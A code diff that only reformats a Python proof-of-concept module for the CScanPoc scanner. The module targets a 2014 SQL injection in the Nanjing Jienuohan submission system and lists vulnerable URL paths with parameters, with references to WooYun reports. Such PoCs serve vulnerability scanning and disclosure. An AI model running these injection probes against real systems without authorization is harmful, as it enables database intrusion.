@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Jienuohan_0002' # 平台漏洞编号，留空
+    vuln_id = 'Jienuohan_0002'  # 平台漏洞编号，留空
     name = '南京杰诺瀚投稿系统 通用型SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-20'  # 漏洞公布时间
     desc = '''
         南京杰诺瀚投稿系统，
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = '杰诺瀚投稿系统'  # 漏洞应用名称
     product_version = '南京杰诺瀚投稿系统'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '55c1a3c3-6d90-4921-ac65-5b113998333e'
     author = '47bwy'  # POC编写者
@@ -35,11 +37,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-080467
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-083812
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-083817
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-083852
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-080467
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-083812
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-083817
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-083852
             payloads = [
                 '/CommonPage.aspx?Id=13',
                 '/web/ViewAbstract.aspx?GaoHao=1',
@@ -63,6 +65,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
